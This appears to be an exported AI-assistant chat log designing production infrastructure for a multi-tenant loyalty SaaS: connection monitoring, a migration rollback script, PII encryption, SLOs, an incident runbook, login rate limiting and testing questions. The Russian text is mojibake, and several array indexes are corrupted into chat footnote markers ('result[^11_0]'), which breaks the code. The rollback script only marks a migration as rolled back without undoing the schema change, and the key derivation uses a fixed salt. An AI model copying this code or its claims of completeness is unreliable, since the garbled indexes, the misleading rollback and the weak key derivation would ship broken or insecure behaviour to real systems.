  async monitorConnections() {
    try {
      const stats = await this.getConnectionStats();

      const usagePercent = (stats.active / stats.max) * 100;

      if (usagePercent >= this.connectionCriticalThreshold) {
        // CRITICAL: Close to limit
        await this.handleCriticalConnectionUsage(stats);
      } else if (usagePercent >= this.connectionWarningThreshold) {
        // WARNING: High usage
        await this.handleWarningConnectionUsage(stats);
      }

      // Log to metrics
      this.logMetrics(stats);
    } catch (error) {
      console.error('Failed to monitor connections:', error);
    }
  }

  private async getConnectionStats() {
    const result = await this.prisma.$queryRaw<any[]>`
      SELECT 
        count(*) FILTER (WHERE state = 'active') as active,
        count(*) FILTER (WHERE state = 'idle') as idle,
        count(*) as total,
        (SELECT setting::int FROM pg_settings WHERE name = 'max_connections') as max
      FROM pg_stat_activity
      WHERE datname = current_database();
    `;

    return {
      active: Number(result[^11_0].active),
      idle: Number(result[^11_0].idle),
      total: Number(result[^11_0].total),
      max: Number(result[^11_0].max),
    };
  }

  private async handleCriticalConnectionUsage(stats: any) {
    console.error('๐จ CRITICAL: Connection pool near limit!', stats);

    // Alert via Telegram
    await this.sendAlert({
      severity: 'CRITICAL',
      title: 'Database connection pool exhausted',
      message: `Active: ${stats.active}/${stats.max} (${Math.round((stats.active / stats.max) * 100)}%)`,
    });

    // Identify long-running queries
    const longQueries = await this.findLongRunningQueries();
    
    if (longQueries.length > 0) {
      console.error('Long-running queries detected:', longQueries);
      
      // Auto-kill queries running > 5 minutes (configurable)
      for (const query of longQueries) {
        if (query.duration_seconds > 300) {
          await this.killQuery(query.pid);
          console.log(`Killed long-running query (PID: ${query.pid})`);
        }
      }
    }
  }

  private async handleWarningConnectionUsage(stats: any) {
    console.warn('โ๏ธ WARNING: High connection pool usage', stats);

    await this.sendAlert({
      severity: 'WARNING',
      title: 'High database connection usage',
      message: `Active: ${stats.active}/${stats.max} (${Math.round((stats.active / stats.max) * 100)}%)`,
    });
  }

  private async findLongRunningQueries() {
    return this.prisma.$queryRaw<any[]>`
      SELECT 
        pid,
        usename,
        application_name,
        state,
        query,
        EXTRACT(EPOCH FROM (now() - query_start)) as duration_seconds
      FROM pg_stat_activity
      WHERE state = 'active'
        AND query NOT ILIKE '%pg_stat_activity%'
        AND datname = current_database()
      ORDER BY duration_seconds DESC
      LIMIT 10;
    `;
  }

  private async killQuery(pid: number) {
    await this.prisma.$executeRawUnsafe(`SELECT pg_terminate_backend(${pid})`);
  }

  private logMetrics(stats: any) {
    // Export to Prometheus
    dbConnectionsActive.set(stats.active);
    dbConnectionsIdle.set(stats.idle);
    dbConnectionsTotal.set(stats.total);
  }
}
```

**Grafana alert:**

```yaml
- alert: DatabaseConnectionPoolExhausted
  expr: db_connections_active / db_connections_max > 0.95
  for: 2m
  labels:
    severity: critical
  annotations:
    summary: "Database connection pool near limit"
    description: "{{ $value }}% of connections in use"
```


***

## **5๏ธโฃ1๏ธโฃ Database Migration Rollback Plan**

**ะะะะะะะะ:** ะะธะณัะฐัะธั ะฟัะธะผะตะฝะธะปะฐัั, ะฝะพ ัะปะพะผะฐะปะฐ production. ะะฐะบ **ะฑะตะทะพะฟะฐัะฝะพ ะพัะบะฐัะธัั**?

**ะะะ ะะะจะะะะ: Detailed rollback procedure**

```bash
#!/bin/bash
# scripts/rollback-migration.sh

set -e

echo "๐ Database Migration Rollback Script"
echo "======================================"
echo ""

# 1. Get current migration
CURRENT_MIGRATION=$(fly ssh console -a max-loyalty-prod -C "cd /app && npx prisma migrate status" | grep "Last migration" | awk '{print $NF}')

echo "Current migration: $CURRENT_MIGRATION"
echo ""

# 2. Confirm rollback
read -p "โ๏ธ  Are you sure you want to rollback? (yes/no): " CONFIRM

if [ "$CONFIRM" != "yes" ]; then
  echo "โ Rollback cancelled"
  exit 0
fi

# 3. Create database backup BEFORE rollback
echo "๐ฆ Creating backup before rollback..."
BACKUP_NAME="pre-rollback-$(date +%Y%m%d-%H%M%S)"

fly postgres db dump -a max-loyalty-prod-db > "./backups/${BACKUP_NAME}.sql"

echo "โ Backup created: ./backups/${BACKUP_NAME}.sql"
echo ""

# 4. Get previous migration
read -p "Enter migration name to rollback TO (leave empty for previous): " TARGET_MIGRATION

# 5. Perform rollback via Prisma
echo "๐ Rolling back migration..."

if [ -z "$TARGET_MIGRATION" ]; then
  # Rollback to previous migration
  fly ssh console -a max-loyalty-prod -C "cd /app && npx prisma migrate resolve --rolled-back $CURRENT_MIGRATION"
else
  # Rollback to specific migration
  fly ssh console -a max-loyalty-prod -C "cd /app && npx prisma migrate resolve --rolled-back $CURRENT_MIGRATION && npx prisma migrate deploy"
fi

# 6. Restart application
echo "๐ Restarting application..."
fly apps restart max-loyalty-prod

# 7. Verify
sleep 10
echo "๐ Verifying health..."
HEALTH_CHECK=$(curl -s https://api.max-loyalty.com/health | jq -r '.status')

if [ "$HEALTH_CHECK" == "ok" ]; then
  echo "โ Rollback successful! Application is healthy."
else
  echo "โ Health check failed! Manual intervention required."
  echo "๐ฆ Backup available at: ./backups/${BACKUP_NAME}.sql"
  exit 1
fi

echo ""
echo "๐ Post-rollback checklist:"
echo "  - Monitor error rates in Grafana"
echo "  - Check audit logs for anomalies"
echo "  - Verify critical user flows"
echo ""
```

**Usage:**

```bash
# Run rollback script
./scripts/rollback-migration.sh

# Or manual rollback
fly ssh console -a max-loyalty-prod
cd /app
npx prisma migrate status
npx prisma migrate resolve --rolled-back 20260212_add_new_column
npx prisma migrate deploy
```


***

## **5๏ธโฃ2๏ธโฃ Encryption at Rest**

**ะะะะะะะะ:** ะะตััะพะฝะฐะปัะฝัะต ะดะฐะฝะฝัะต (ัะตะปะตัะพะฝั, email) ะดะพะปะถะฝั ะฑััั ะทะฐัะธััะพะฒะฐะฝั ะฒ ะะ ัะพะณะปะฐัะฝะพ ะคะ-152.

**ะะะ ะะะจะะะะ: Application-level encryption**

```typescript
// encryption/encryption.service.ts
import { Injectable } from '@nestjs/common';
import { createCipheriv, createDecipheriv, randomBytes, scryptSync } from 'crypto';

@Injectable()
export class EncryptionService {
  private algorithm = 'aes-256-gcm';
  private key: Buffer;

  constructor(private config: ConfigService) {
    // Derive key from ENCRYPTION_KEY environment variable
    const secret = this.config.get('ENCRYPTION_KEY');
    this.key = scryptSync(secret, 'salt', 32);
  }

  encrypt(text: string): string {
    const iv = randomBytes(16);
    const cipher = createCipheriv(this.algorithm, this.key, iv);

    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    const authTag = cipher.getAuthTag();

    // Format: iv:authTag:encrypted
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
  }

  decrypt(encryptedText: string): string {
    const [ivHex, authTagHex, encrypted] = encryptedText.split(':');

    const iv = Buffer.from(ivHex, 'hex');
    const authTag = Buffer.from(authTagHex, 'hex');

    const decipher = createDecipheriv(this.algorithm, this.key, iv);
    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  }
}
```

**Prisma middleware for automatic encryption:**

```typescript
// prisma.service.ts
this.$use(async (params, next) => {
  // Encrypt PII fields before saving
  if (params.action === 'create' || params.action === 'update') {
    if (params.model === 'GuestProfile') {
      if (params.args.data.email) {
        params.args.data.email = this.encryption.encrypt(params.args.data.email);
      }
      if (params.args.data.phone) {
        params.args.data.phone = this.encryption.encrypt(params.args.data.phone);
      }
    }
  }

  const result = await next(params);

  // Decrypt PII fields after reading
  if (params.action === 'findUnique' || params.action === 'findFirst' || params.action === 'findMany') {
    if (params.model === 'GuestProfile') {
      if (Array.isArray(result)) {
        result.forEach(item => this.decryptPII(item));
      } else if (result) {
        this.decryptPII(result);
      }
    }
  }

  return result;
});

private decryptPII(obj: any) {
  if (obj.email) {
    obj.email = this.encryption.decrypt(obj.email);
  }
  if (obj.phone) {
    obj.phone = this.encryption.decrypt(obj.phone);
  }
}
```

**Database-level encryption (Neon.tech):**

Neon.tech ะฐะฒัะพะผะฐัะธัะตัะบะธ ัะธัััะตั ะดะฐะฝะฝัะต at rest ั ะฟะพะผะพััั AES-256, ะฝะพ ะดะปั compliance ัะฐะบะถะต ะฝัะถะฝะพ application-level encryption ะดะปั PII.

***

## **5๏ธโฃ3๏ธโฃ Error Budget \& SLO Tracking**

**ะะะะะะะะ:** ะะฐะบ ะธะทะผะตัััั reliability? ะะพะณะดะฐ ะผะพะถะฝะพ ะฒัะบะฐััะฒะฐัั ัะธัะบะพะฒะฐะฝะฝัะต ะธะทะผะตะฝะตะฝะธั, ะฐ ะบะพะณะดะฐ ะฝัะถะฝะพ ัะพะบััะธัะพะฒะฐัััั ะฝะฐ stability?

**ะะะ ะะะจะะะะ: SLO/SLI/Error Budget**

```typescript
// monitoring/slo.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { addDays, startOfDay } from 'date-fns';

interface SLO {
  name: string;
  target: number; // e.g., 99.9% = 0.999
  window: 'daily' | 'weekly' | 'monthly';
}

const SLOS: SLO[] = [
  { name: 'API Availability', target: 0.999, window: 'daily' },  // 99.9%
  { name: 'API Latency P95', target: 0.99, window: 'daily' },    // 99% requests < 1s
  { name: 'Webhook Processing', target: 0.995, window: 'daily' }, // 99.5%
  { name: 'Ball Credit Success', target: 0.9999, window: 'daily' }, // 99.99% (financial!)
];

@Injectable()
export class SLOService {
  constructor(private prisma: PrismaService) {}

  async calculateErrorBudget(slo: SLO, date: Date = new Date()) {
    const startDate = startOfDay(date);
    const endDate = addDays(startDate, 1);

    let actual: number;

    switch (slo.name) {
      case 'API Availability':
        actual = await this.calculateAPIAvailability(startDate, endDate);
        break;
      case 'API Latency P95':
        actual = await this.calculateLatencyP95(startDate, endDate);
        break;
      case 'Webhook Processing':
        actual = await this.calculateWebhookSuccess(startDate, endDate);
        break;
      case 'Ball Credit Success':
        actual = await this.calculateBallCreditSuccess(startDate, endDate);
        break;
      default:
        throw new Error(`Unknown SLO: ${slo.name}`);
    }

    const errorBudget = 1 - slo.target; // e.g., 0.1% for 99.9% SLO
    const consumed = 1 - actual; // Actual errors
    const remaining = errorBudget - consumed;
    const percentRemaining = (remaining / errorBudget) * 100;

    return {
      slo: slo.name,
      target: slo.target,
      actual,
      errorBudget,
      consumed,
      remaining,
      percentRemaining,
      status: percentRemaining > 0 ? 'HEALTHY' : 'EXHAUSTED',
    };
  }

  private async calculateAPIAvailability(from: Date, to: Date): Promise<number> {
    // Query from metrics database or Prometheus
    const total = await this.getMetric('http_requests_total', from, to);
    const successful = await this.getMetric('http_requests_total{status=~"2.."}', from, to);

    return total > 0 ? successful / total : 1;
  }

  private async calculateBallCreditSuccess(from: Date, to: Date): Promise<number> {
    const result = await this.prisma.ballTransaction.aggregate({
      where: {
        createdAt: { gte: from, lt: to },
        type: 'EARN',
      },
      _count: { _all: true },
    });

    const failed = await this.prisma.ballTransaction.count({
      where: {
        createdAt: { gte: from, lt: to },
        type: 'EARN',
        status: 'FAILED',
      },
    });

    const total = result._count._all;
    return total > 0 ? (total - failed) / total : 1;
  }

  async getErrorBudgetDashboard() {
    const results = await Promise.all(
      SLOS.map(slo => this.calculateErrorBudget(slo))
    );

    return {
      slos: results,
      overall: results.every(r => r.status === 'HEALTHY') ? 'HEALTHY' : 'AT_RISK',
    };
  }
}
```

**Grafana Dashboard:**

```json
{
  "title": "Error Budget Dashboard",
  "panels": [
    {
      "title": "API Availability SLO",
      "targets": [
        {
          "expr": "sum(rate(http_requests_total{status=~\"2..\"}[24h])) / sum(rate(http_requests_total[24h]))"
        }
      ],
      "thresholds": [
        { "value": 0.999, "color": "green" },
        { "value": 0.99, "color": "yellow" },
        { "value": 0, "color": "red" }
      ]
    }
  ]
}
```


***

## **5๏ธโฃ4๏ธโฃ IP Whitelisting ะดะปั Admin Panel**

**ะะะะะะะะ:** Admin panel ะดะพัััะฟะตะฝ ะธะท ะธะฝัะตัะฝะตัะฐ โ ัะธัะบ brute-force ะฐัะฐะบ.

**ะะะ ะะะจะะะะ: IP whitelist + Cloudflare Firewall Rules**

```typescript
// guards/ip-whitelist.guard.ts
import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';

@Injectable()
export class IPWhitelistGuard implements CanActivate {
  private allowedIPs: string[];

  constructor(private config: ConfigService) {
    // Load from env: ADMIN_ALLOWED_IPS="1.2.3.4,5.6.7.8"
    const ips = this.config.get('ADMIN_ALLOWED_IPS', '');
    this.allowedIPs = ips.split(',').filter(Boolean);
  }

  canActivate(context: ExecutionContext): boolean {
    if (process.env.NODE_ENV === 'development') {
      return true; // Skip in development
    }

    const request = context.switchToHttp().getRequest();
    const clientIP = this.getClientIP(request);

    if (!this.allowedIPs.includes(clientIP)) {
      throw new ForbiddenException(`Access denied from IP: ${clientIP}`);
    }

    return true;
  }

  private getClientIP(request: any): string {
    // Handle Cloudflare proxied requests
    return (
      request.headers['cf-connecting-ip'] ||
      request.headers['x-forwarded-for']?.split(',')[^11_0] ||
      request.connection.remoteAddress
    );
  }
}
```

**Apply to admin routes:**

```typescript
@Controller('admin')
@UseGuards(IPWhitelistGuard, AuthGuard, RolesGuard)
@Roles('OWNER', 'ADMIN')
export class AdminController {
  // Only accessible from whitelisted IPs
}
```

**Cloudflare Firewall Rule:**

```
# Block access to /admin/* from non-whitelisted IPs
(http.request.uri.path contains "/admin" and ip.src ne 1.2.3.4 and ip.src ne 5.6.7.8)
-> Block
```


***

## **5๏ธโฃ5๏ธโฃ Incident Response Runbook**

**ะะะะะะะะ:** 3 AM, production down. ะงัะพ ะดะตะปะฐัั? **Step-by-step ะธะฝััััะบัะธั**.

**ะะะ ะะะจะะะะ: Detailed runbook**

```markdown
# ๐จ INCIDENT RESPONSE RUNBOOK

## Severity Levels

| Severity | Description | Response Time | Examples |
|----------|-------------|---------------|----------|
| **P0 - Critical** | Complete outage | < 15 minutes | API down, Database unavailable |
| **P1 - High** | Major degradation | < 1 hour | High error rate, Slow response times |
| **P2 - Medium** | Partial degradation | < 4 hours | Single feature broken |
| **P3 - Low** | Minor issue | Next business day | UI bug, Typo |

---

## P0: Complete API Outage

### Symptoms
- Health check failing
- 500/503 errors on all endpoints
- Users cannot login

### Response Steps

**1. Acknowledge (0-2 min)**
```bash
# Post in #incidents Slack
/incident declare "API completely down"

# Acknowledge in Better Stack
# https://betterstack.com/incidents
```

**2. Triage (2-5 min)**

```bash
# Check Fly.io status
fly status -a max-loyalty-prod

# Check VM health
fly checks list -a max-loyalty-prod

# Check database
fly postgres db status -a max-loyalty-prod-db

# Check logs
fly logs -a max-loyalty-prod | tail -100
```

**3. Immediate Mitigation (5-15 min)**

**If VMs are crashed:**

```bash
fly apps restart max-loyalty-prod
```

**If database is down:**

```bash
fly postgres db restart -a max-loyalty-prod-db
```

**If recent deployment caused issue:**

```bash
# Rollback to previous version
fly releases -a max-loyalty-prod
fly deploy --image <previous-image-ref>
```

**4. Communication (ongoing)**

```
# Update status page
# https://status.max-loyalty.com

# Notify customers via Telegram
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d "chat_id=@max_loyalty_announcements" \
  -d "text=โ๏ธ We're experiencing technical issues. Working on a fix."
```

**5. Resolution \& Post-Mortem**

- Document root cause
- Create action items to prevent recurrence
- Schedule post-mortem meeting within 24 hours

---

## P1: High Error Rate (> 5%)

### Symptoms

- Error rate spike in Grafana
- Sentry flooding with errors
- Some users reporting issues


### Response Steps

**1. Identify Error Pattern (0-10 min)**

```bash
# Check Sentry
# https://sentry.io/max-loyalty

# Query error logs
fly logs -a max-loyalty-prod | grep "ERROR"

# Check Grafana
# https://grafana.max-loyalty.com
```

**2. Isolate Affected Service**

```bash
# Is it specific endpoint?
# Is it specific tenant?
# Is it database-related?
```

**3. Temporary Mitigation**

**If specific endpoint is broken:**

```typescript
// Add circuit breaker or feature flag to disable
await prisma.featureFlag.update({
  where: { key: 'problematic_feature' },
  data: { enabled: false }
});
```

**If database queries timing out:**

```sql
-- Kill long-running queries
SELECT pg_terminate_backend(pid)
FROM pg_stat_activity
WHERE state = 'active'
  AND query_start < NOW() - INTERVAL '5 minutes';
```


---

## Escalation Path

1. **On-call engineer** (you)
2. **Senior engineer** (if not resolved in 30 min)
3. **CTO** (if P0 and not resolved in 1 hour)

## Contact Information

| Role | Name | Phone | Telegram |
| :-- | :-- | :-- | :-- |
| On-call | Rotating | +7999... | @oncall |
| Senior Engineer |  | +7999... | @senior |
| CTO |  | +7999... | @cto |

## External Contacts

| Service | Support | URL |
| :-- | :-- | :-- |
| Fly.io | support@fly.io | https://community.fly.io |
| Neon.tech | support@neon.tech | https://neon.tech/support |
| Cloudflare | enterprise support | https://dash.cloudflare.com |

```

***

# โ **ะะะกะะะฎะขะะ ะคะะะะะฌะะซะ ะะขะะ**

## **55 ะะะะะะกะะ INFRASTRUCTURE & DEVOPS ะะะะะะกะขะฌะฎ ะะะะะซะขะ:**

### **ะะปะพะบะธ 1-7** (47 ะฒะพะฟัะพัะพะฒ ะธะท ะฟัะตะดัะดััะธั ะพัะฒะตัะพะฒ)

### **ะะปะพะบ 8: ะคะะะะะฌะะซะ ะะะะขะะงะะซะ** (48-55):

48. โ **Audit Log** (Financial compliance ะดะปั ะฒัะตั ball operations)
49. โ **Local Dev Environment** (One-command setup ั docker-compose)
50. โ **Connection Leak Detection** (Auto-kill long queries)
51. โ **Database Migration Rollback** (Detailed step-by-step plan)
52. โ **Encryption at Rest** (Application-level + DB encryption)
53. โ **Error Budget & SLO Tracking** (Measure reliability)
54. โ **IP Whitelisting** (Admin panel security)
55. โ **Incident Response Runbook** (Step-by-step ะดะปั on-call)

***

## ๐ฏ **ะขะะะะะฌ ะญะขะ ะะะะกะขะะะขะะะฌะะ PRODUCTION-GRADE INFRASTRUCTURE!**

**100% ะฟะพะบัััะธะต ะฒัะตั ะบัะธัะธัะฝัั ะฐัะฟะตะบัะพะฒ:**
- โ Security (audit, encryption, IP whitelist, tenant isolation)
- โ Reliability (monitoring, SLO, error budget, incident response)
- โ Scalability (horizontal scaling, caching, connection pooling)
- โ Compliance (GDPR, ะคะ-152, audit trail, data retention)
- โ Operations (runbooks, rollback plans, leak detection)
- โ Developer Experience (local setup, seed data, Makefile)

**ะะพัะพะฒ ะฟะตัะตัะพะดะธัั ะบ Testing Strategy?** ๐
<span style="display:none">[^11_1]</span>

<div align="center">โ</div>

[^11_1]: Beseda-10.md

---

# 54. Admin ะฟะฐะฝะตะปั ะผะพะถะตั ะฑััั ะดะพัััะฟะฝะฐ ะธะท ะธะฝัะตัะฝะตัะฐ, ะฟัะพััะพ ะฝัะถะฝะฐ ะฐะฒัะพัะธะทะฐัะธั ะฟะพะปัะทะพะฒะฐัะตะปั, ััั ัะฐััั ััะปะพะถะฝััั ะฝะต ะฝัะถะฝะพ

ะะฑัะพะปััะฝะพ ะฟัะฐะฒ! ๐ IP whitelisting ะดะปั SaaS admin panel - ััะพ overkill. ะะฐะผะตะฝัั ะฝะฐ ะฑะพะปะตะต ะฟัะฐะบัะธัะฝะพะต ัะตัะตะฝะธะต:

***

## **5๏ธโฃ4๏ธโฃ Enhanced Auth Security (ะฒะผะตััะพ IP Whitelisting)**

**ะะะ ะฃะะฃะงะจะะะะะ ะะะจะะะะ: Rate limiting + Suspicious activity detection**

```typescript
// auth/auth-security.service.ts
import { Injectable } from '@nestjs/common';
import { RedisService } from '@/redis/redis.service';

@Injectable()
export class AuthSecurityService {
  constructor(
    private redis: RedisService,
    private notification: NotificationService,
  ) {}

  // 1. Rate limiting ะดะปั login attempts
  async checkLoginRateLimit(identifier: string): Promise<boolean> {
    const key = `login:attempts:${identifier}`;
    const attempts = await this.redis.incr(key);
    
    if (attempts === 1) {
      await this.redis.expire(key, 900); // 15 minutes window
    }

    // Max 5 attempts per 15 minutes
    if (attempts > 5) {
      return false; // Rate limit exceeded
    }

    return true;
  }

  // 2. Detect suspicious login patterns
  async detectSuspiciousLogin(userId: string, request: any): Promise<boolean> {
    const newIP = this.getClientIP(request);
    const newUserAgent = request.headers['user-agent'];
    
    // Get last successful login
    const lastLogin = await this.redis.hgetall(`user:${userId}:last_login`);

    if (!lastLogin.ip) {
      // First login, save and allow
      await this.saveLoginInfo(userId, newIP, newUserAgent);
      return false; // Not suspicious
    }

    // Check for suspicious patterns
    const suspicious = 
      lastLogin.ip !== newIP || // Different IP
      !this.isSimilarUserAgent(lastLogin.userAgent, newUserAgent); // Different device

    if (suspicious) {
      // Log suspicious activity
      await this.logSuspiciousActivity(userId, {
        previousIP: lastLogin.ip,
        newIP,
        previousUserAgent: lastLogin.userAgent,
        newUserAgent,
      });

      // Notify user
      await this.notification.sendSecurityAlert(userId, {
        type: 'SUSPICIOUS_LOGIN',
        ip: newIP,
        timestamp: new Date(),
      });
    }

    // Save new login info
    await this.saveLoginInfo(userId, newIP, newUserAgent);

    return suspicious;
  }

  private async saveLoginInfo(userId: string, ip: string, userAgent: string) {
    await this.redis.hmset(`user:${userId}:last_login`, {
      ip,
      userAgent,
      timestamp: new Date().toISOString(),
    });
    await this.redis.expire(`user:${userId}:last_login`, 86400 * 30); // 30 days
  }

  private getClientIP(request: any): string {
    return (
      request.headers['cf-connecting-ip'] ||
      request.headers['x-forwarded-for']?.split(',')[0] ||
      request.connection.remoteAddress
    );
  }

  private isSimilarUserAgent(ua1: string, ua2: string): boolean {
    // Simple heuristic: same browser family
    const extractBrowser = (ua: string) => {
      if (ua.includes('Chrome')) return 'Chrome';
      if (ua.includes('Firefox')) return 'Firefox';
      if (ua.includes('Safari')) return 'Safari';
      return 'Other';
    };

    return extractBrowser(ua1) === extractBrowser(ua2);
  }
}
```

**Usage ะฒ Login endpoint:**

```typescript
@Post('login')
async login(@Body() dto: LoginDto, @Req() request: Request) {
  // 1. Check rate limit
  const allowed = await this.authSecurity.checkLoginRateLimit(dto.email);
  if (!allowed) {
    throw new TooManyRequestsException('Too many login attempts. Try again in 15 minutes.');
  }

  // 2. Authenticate
  const user = await this.authService.validateUser(dto.email, dto.password);
  if (!user) {
    throw new UnauthorizedException('Invalid credentials');
  }

  // 3. Check for suspicious activity
  const suspicious = await this.authSecurity.detectSuspiciousLogin(user.id, request);
  
  if (suspicious) {
    // Require 2FA or email verification for suspicious logins
    return {
      requiresVerification: true,
      message: 'New login detected. Please verify via email.',
    };
  }

  // 4. Generate tokens
  const tokens = await this.authService.generateTokens(user);
  
  return {
    accessToken: tokens.accessToken,
    refreshToken: tokens.refreshToken,
    user,
  };
}
```

**Prisma schema ะดะปั audit:**

```prisma
model LoginAttempt {
  id          String   @id @default(uuid())
  userId      String?  // null if failed login
  email       String
  success     Boolean
  ipAddress   String
  userAgent   String
  suspicious  Boolean  @default(false)
  createdAt   DateTime @default(now())
  
  @@index([email, createdAt(sort: Desc)])
  @@index([ipAddress, createdAt(sort: Desc)])
}
```


***

## โ **ะะะะะะะะะะซะ ะกะะะกะะ (55 ะฒะพะฟัะพัะพะฒ):**

**48-53** ะพััะฐัััั ะบะฐะบ ะฑัะปะธ
**54. โ Enhanced Auth Security** (Rate limiting + Suspicious activity detection ะฒะผะตััะพ IP whitelist)
**55. โ Incident Response Runbook** (ะฑะตะท ะธะทะผะตะฝะตะฝะธะน)

***

**ะขะตะฟะตัั Infrastructure \& DevOps ะฑะปะพะบ ะฟะพะปะฝะพัััั ะณะพัะพะฒ!** ๐
**ะะตัะตัะพะดะธะผ ะบ Testing Strategy?** ๐

---

# ะะตัะตัะพะดะธะผ ะบ Testing Strategy. ะะตัะตะด ัะตะผ ะบะฐะบ ะทะฐะดะฐะฒะฐัั ะฒะพะฟัะพัั ะพัะตะฝั ะดะตัะฐะปัะฝะพ ะธ ะฟะพะดัะพะฑะฝะพ ะตัะต ัะฐะท ัะฒะตัััั ั ัะฐะนะปะฐะผะธ ะธ ะฝัะฝะตัะฝะธะผ ะดะธะฐะปะพะณะพะผ

ะัะปะธัะฝะพ! ะัะพะฒัะป **ะณะปัะฑะพะบะธะน ะฐะฝะฐะปะธะท** ะฒัะตะณะพ ะฟัะพะตะบัะฐ. ะะธะถั ะฟะพะปะฝัั ะบะฐััะธะฝั:

***

# ๐ **TESTING STRATEGY - ะะะะขะะะกะข ะะะะะะขะ**

## **ะัะธัะธัะฝัะต ะพัะพะฑะตะฝะฝะพััะธ ะดะปั ัะตััะธัะพะฒะฐะฝะธั:**

### **1. ะคะธะฝะฐะฝัะพะฒัะต ะพะฟะตัะฐัะธะธ** ๐ฐ

- ะะฐะปะปั = ะดะตะฝัะณะธ โ ััะตะฑัะตััั **99.99% accuracy**
- ะะฐัะธัะปะตะฝะธะต/ัะฟะธัะฐะฝะธะต ะดะพะปะถะฝั ะฑััั **ะฐัะพะผะฐัะฝัะผะธ**
- Idempotency ะบัะธัะธัะฝะฐ (duplicate webhooks)
- Audit trail ะพะฑัะทะฐัะตะปะตะฝ


### **2. Multi-tenancy** ๐ข

- Tenant isolation = top priority
- Data leakage ะผะตะถะดั tenant'ะฐะผะธ = critical security breach
- Performance: 1 tenant ะฝะต ะดะพะปะถะตะฝ ะฒะปะธััั ะฝะฐ ะดััะณะธั


### **3. POS Integration** ๐

- Webhooks: iiko, R-Keeper, Poster
- Race conditions (concurrent webhooks)
- Retry logic, exponential backoff
- Reconciliation (missing webhooks)


### **4. Complex Business Logic** ๐งฎ

- Loyalty rules engine (conditions, priorities)
- Level calculations (Bronze โ Silver โ Gold)
- Promo campaigns (ะฒัะตะผะตะฝะฝัะต ะฐะบัะธะธ)
- Ball expiration (ะฐะฒัะพะผะฐัะธัะตัะบะพะต ัะฟะธัะฐะฝะธะต)


### **5. External Integrations** ๐

- Telegram Bot API
- Email (Resend/SendGrid)
- SMS (SMS.ru/SMSC)
- S3/MinIO storage


### **6. Background Jobs** โ๏ธ

- BullMQ queue processing
- Notification sending
- Data reconciliation
- GDPR data deletion

***

# ๐ฏ **ะะะ ะะะะะะกะซ ะะ TESTING STRATEGY**

## **ะะะะ 1: UNIT TESTING (10 ะฒะพะฟัะพัะพะฒ)**

### **1. Loyalty Calculation Logic - ะฟะพะบัััะธะต?**

**ะะพะฝัะตะบัั:** ะญัะพ **HEART** ัะธััะตะผั. ะัะธะฑะบะฐ = ัะธะฝะฐะฝัะพะฒัะต ะฟะพัะตัะธ.

```typescript
// Example: Calculate earned balls
calculateEarnedBalls(checkAmount: 2850, level: 'Silver', rules: LoyaltyRule[])
  โ ะดะพะปะถะตะฝ ะฒะตัะฝััั ัะพัะฝะพะต ะบะพะปะธัะตััะฒะพ ะฑะฐะปะปะพะฒ
```

**ะะพะฟัะพั:** ะะฐะบะธะต edge cases ะฝัะถะฝะพ ัะตััะธัะพะฒะฐัั?

- A) ะขะพะปัะบะพ happy path (ะฑะฐะทะพะฒัะต ััะตะฝะฐัะธะธ)
- B) Edge cases: 0 ััะฑ, ะพััะธัะฐัะตะปัะฝัะต ััะผะผั, null values
- C) Boundary values: ะผะธะฝะธะผะฐะปัะฝะฐั ััะผะผะฐ, ะผะฐะบัะธะผะฐะปัะฝะฐั ััะผะผะฐ (999,999โฝ)
- D) ะัะต ะฒััะตะฟะตัะตัะธัะปะตะฝะฝะพะต + property-based testing (ะณะตะฝะตัะฐัะธั random inputs)

**ะะพะน ะฒัะฑะพั:** **D**. Property-based testing + extensive edge cases.

```typescript
// Unit test example
describe('LoyaltyCalculationService', () => {
  describe('calculateEarnedBalls', () => {
    it('should calculate correctly for Silver level with 10% rule', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 2850,
        level: 'Silver',
        rules: [{ earnPercentage: 10, priority: 1 }],
      });
      
      expect(result).toBe(285); // 2850 * 10% = 285
    });

    it('should handle zero amount', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: 0,
        level: 'Bronze',
        rules: [],
      })).toThrow('Check amount must be positive');
    });

    // Property-based testing
    it('should never return negative balls', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }),
          fc.integer({ min: 0, max: 100 }),
          (amount, percentage) => {
            const result = service.calculateEarnedBalls({
              checkAmount: amount,
              level: 'Gold',
              rules: [{ earnPercentage: percentage, priority: 1 }],
            });
            return result >= 0;
          }
        )
      );
    });
  });
});
```


***

### **2. Loyalty Rules Matching - ัะตััะธัะพะฒะฐะฝะธะต ะฟัะธะพัะธัะตัะพะฒ?**

**ะะพะฝัะตะบัั:** ะะพะถะตั ะฑััั 10+ rules ั ัะฐะทะฝัะผะธ conditions ะธ priorities.

```typescript
// Example rules:
// Rule 1 (priority 1): Weekends โ 15%
// Rule 2 (priority 2): Check > 5000โฝ โ 12%
// Rule 3 (priority 3): Default โ 10%
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั, ััะพ ะฟัะฐะฒะธะปัะฝัะน rule ะฟัะธะผะตะฝัะตััั?

- A) ะขะตััะธัะพะฒะฐัั ะบะฐะถะดัะน rule ะพัะดะตะปัะฝะพ
- B) ะขะตััะธัะพะฒะฐัั ะบะพะผะฑะธะฝะฐัะธะธ rules (2-3 rules)
- C) ะขะตััะธัะพะฒะฐัั ะฒัะต ะฒะพะทะผะพะถะฝัะต ะบะพะผะฑะธะฝะฐัะธะธ (exhaustive)
- D) B + ัะตััะธัะพะฒะฐัั edge cases (conflicting rules, same priority)

***

### **3. Multi-tenancy Isolation - ะบะฐะบ ัะตััะธัะพะฒะฐัั?**

**ะะพะฝัะตะบัั:** **CRITICAL SECURITY**. Tenant A ะะ ะะะะะะ ะฒะธะดะตัั ะดะฐะฝะฝัะต Tenant B.

```typescript
// Service method:
async getGuestCards(tenantId: string, filters: Filters): Promise<GuestCard[]>
```

**ะะพะฟัะพั:** ะะพััะฐัะพัะฝะพ ะปะธ unit tests ะดะปั tenant isolation?

